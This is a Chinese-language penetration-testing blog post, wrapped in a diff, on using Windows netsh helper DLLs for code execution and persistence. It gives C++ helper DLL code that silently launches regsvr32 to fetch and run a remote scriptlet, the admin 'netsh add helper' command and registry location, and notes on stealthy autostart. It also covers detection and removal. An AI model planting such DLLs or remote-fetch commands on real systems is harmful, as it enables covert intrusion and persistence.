@@ -1,0 +1,257 @@
+I"�"<p><strong>About:</strong></p>
+
+<ul>
+  <li>Common commands of netsh</li>
+  <li>Matthew Demaske’s way of using netshell to execute evil dlls and persist on a host</li>
+  <li>Write a dll with the InitHelperDll function</li>
+  <li>How to use</li>
+  <li>Detection</li>
+</ul>
+
+<p><strong>目录：</strong></p>
+
+<ul>
+  <li>介绍netsh的常用命令</li>
+  <li>测试Matthew Demaske分享的方法——using netshell to execute evil dlls and persist on a host</li>
+  <li>如何使用c++编写导出函数为InitHelperDll的helper dll</li>
+  <li>实际测试利用</li>
+  <li>防御和检测</li>
+</ul>
+
+<p><strong>Reference:</strong></p>
+
+<p>http://www.adaptforward.com/2016/09/using-netshell-to-execute-evil-dlls-and-persist-on-a-host/</p>
+
+<h2 id="0x00-简介">0x00 简介</h2>
+<hr />
+<p>在渗透测试中，使用系统中默认支持的命令常常可以绕过各种检测和拦截，比如我在《Use bitsadmin to maintain persistence and bypass Autoruns》中介绍过如何利用系统默认支持的bitsadmin来实现自启动，并绕过Autoruns的检测。</p>
+
+<p>Matthew Demaske在最近分享了一个他发现的方法，同样是利用系统中默认支持的命令——using netshell to execute evil dlls and persist on a host，本文将对其方法进行整理，并补全文中未具体介绍的dll编写方法</p>
+
+<h2 id="0x01-netsh简介">0x01 netsh简介</h2>
+<hr />
+<p>是windows系统本身提供的功能强大的网络配置命令行工具，常用命令如下：</p>
+
+<p>查看ip配置信息：
+<code class="language-plaintext highlighter-rouge">netsh interface ip show config</code></p>
+
+<p>查看网络配置文件：
+<code class="language-plaintext highlighter-rouge">netsh -c interface dump</code></p>
+
+<p>开/关网卡：
+<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=enabled</code>
+<code class="language-plaintext highlighter-rouge">netsh int set int name="ethernet" admin=disabled</code></p>
+
+<p>查看所有tcp连接：
+<code class="language-plaintext highlighter-rouge">netsh interface ip show tcpconnections</code></p>
+
+<p>设置本机ip、子网掩码、网关ip：
+<code class="language-plaintext highlighter-rouge">netsh interface ip set address "Local Area Connection" static 192.168.1.2 255.255.255.0 192.168.1.1</code></p>
+
+<p>查看防火墙状态：
+<code class="language-plaintext highlighter-rouge">netsh firewall show state</code></p>
+
+<p>开/关防火墙：</p>
+
+<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode enable</code></p>
+
+<p><code class="language-plaintext highlighter-rouge">netsh firewall set opmode disable</code></p>
+
+<p>输入netsh /?可查看更详细的命令帮助，其中add命令值得注意，输入netsh add /?获得更详细内容：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netsh add /?
+The following commands are available:
+Commands in this context:
+add helper - Installs a helper DLL.
+</code></pre></div></div>
+
+<p>如果在此添加一个测试dll，结果会怎样呢？</p>
+
+<h2 id="0x02-编写helper-dll">0x02 编写helper DLL</h2>
+<hr />
+<p>每个helper DLL都需要包含导出函数InitHelperDll</p>
+
+<p>在添加helper DLL后，每次netsh在初始加载的时候会调用该helper DLL中的导出函数InitHelperDll</p>
+
+<p>InitHelperDll示例如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD
+WINAPI
+InitHelperDll(
+    DWORD      dwNetshVersion,
+    PVOID      pReserved
+)
+{
+    NS_HELPER_ATTRIBUTES attMyAttributes;
+
+    attMyAttributes.guidHelper = g_MyGuid;
+    attMyAttributes.dwVersion  = 1;
+    attMyAttributes.pfnStart   = NetshStartHelper;
+    RegisterHelper( NULL, &amp;attMyAttributes );
+    return NO_ERROR;
+}
+</code></pre></div></div>
+
+<p>关于InitHelperDll的细节可参照如下链接：</p>
+
+<p>https://msdn.microsoft.com/en-us/library/windows/desktop/ms708327(v=vs.85).aspx</p>
+
+<p>在《Code Execution of Regsvr32.exe》曾具体介绍过如何为dll添加一个导出函数，所以在这里接着简单介绍一下：</p>
+
+<p>新建c++工程，创建一个dll项目 在主文件添加:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DWORD WINAPI InitHelperDll(DWORD dwNetshVersion,PVOID pReserved)
+{
+	char *command="cmd.exe /c start regsvr32.exe /s /n /u /i:https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct scrobj.dll";
+    WinExec(command,SW_HIDE); 
+	return 0;
+}
+</code></pre></div></div>
+
+<p>添加导出函数声明:</p>
+
+<p>文件类型：</p>
+
+<p>Text File</p>
+
+<p>名称：</p>
+
+<p>同名文件.def</p>
+
+<p>写入</p>
+
+<p>EXPORTS
+InitHelperDll</p>
+
+<p>编译即可</p>
+
+<p><strong>注：</strong></p>
+
+<p>Marc Smeets分享了他的POC代码，定义导出函数使用的是另一种方式:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>extern "C" __declspec(dllexport) DWORD InitHelperDll(DWORD dwNetshVersion, PVOID pReserved)
+</code></pre></div></div>
+
+<p>payload为创建新线程执行shellcode</p>
+
+<p><strong>项目地址如下：</strong></p>
+
+<p>https://github.com/outflankbv/NetshHelperBeacon</p>
+
+<h2 id="0x03-添加自定义helper-dll">0x03 添加自定义helper dll</h2>
+<hr />
+<p><strong>注：</strong></p>
+
+<p>需要管理员权限</p>
+
+<p>通过cmd添加:</p>
+
+<p><code class="language-plaintext highlighter-rouge">netsh add helper c:\test\netshtest.dll</code></p>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-1.png" alt="Alt text" /></p>
+
+<p>如下图，注册表同步创建键值</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-2.png" alt="Alt text" /></p>
+
+<p>位置：<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>
+
+<p>名称：<code class="language-plaintext highlighter-rouge">netshtest</code></p>
+
+<p>类型：<code class="language-plaintext highlighter-rouge">REG_SZ</code></p>
+
+<p>数据：<code class="language-plaintext highlighter-rouge">c:\test\netshtest.dll</code></p>
+
+<p><strong>注：</strong></p>
+
+<p>通过注册表直接添加键值同netsh add 添加helper dll的作用一样</p>
+
+<h2 id="0x04-触发后门">0x04 触发后门</h2>
+<hr />
+<p>helper dll添加成功后，每次调用netsh，均会加载c:\test\netshtest.dll</p>
+
+<p>如图，运行netsh命令，加载c:\test\netshtest.dll，弹出计算器</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/2-3.png" alt="Alt text" /></p>
+
+<p>验证：</p>
+
+<ul>
+  <li>使用Process Explorer查看netsh进程加载的dll</li>
+</ul>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-1.png" alt="Alt text" /></p>
+
+<ul>
+  <li>使用Process Monitor在进程属性Event Properties也可以查看</li>
+</ul>
+
+<p>如图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-9-29/3-2.png" alt="Alt text" /></p>
+
+<h2 id="0x05-persistence">0x05 Persistence</h2>
+<hr />
+
+<ul>
+  <li>
+    <p>netsh作为系统常用命令，存在被用户正常使用的概率，所以只要启动netsh即可触发payload</p>
+  </li>
+  <li>
+    <p>如果被添加为常用的开机启动项，也很有迷惑性，因为显示的仅仅是启动netsh.exe</p>
+  </li>
+</ul>
+
+<h2 id="0x06-检测">0x06 检测</h2>
+<hr />
+
+<p>监控注册表位置<code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh</code></p>
+
+<p><strong>注：</strong></p>
+
+<ul>
+  <li>
+    <p>netsh show helper命令并不能查到新添加的helper dll</p>
+  </li>
+  <li>
+    <p>需要留意注册表内正常的dll是否被替换</p>
+  </li>
+</ul>
+
+<h2 id="0x07-清除">0x07 清除</h2>
+<hr />
+
+<p>通过cmd:</p>
+
+<p><code class="language-plaintext highlighter-rouge">netsh delete helper c:\test\netshtest.dll</code></p>
+
+<p>通过注册表:</p>
+
+<p><code class="language-plaintext highlighter-rouge">在HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh删除对应键值</code></p>
+
+<h2 id="0x08-小结">0x08 小结</h2>
+<hr />
+
+<ul>
+  <li>
+    <p>Netsh Persistence实现的前提是已经获得了管理员权限</p>
+  </li>
+  <li>
+    <p>部分vpn软件在启动过程中会调用netsh命令，这样就解决了Netsh Persistence的自启动问题，该方法值得测试</p>
+  </li>
+  <li>
+    <p>如果在开机启动项中发现有netsh，值得留意，需要查看对应注册表键值中是否包含恶意的helper dll</p>
+  </li>
+  <li>
+    <p>不同系统中注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NetSh下的默认键值存在差异，需要对比查找默认键值是否被篡改</p>
+  </li>
+</ul>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+:ET
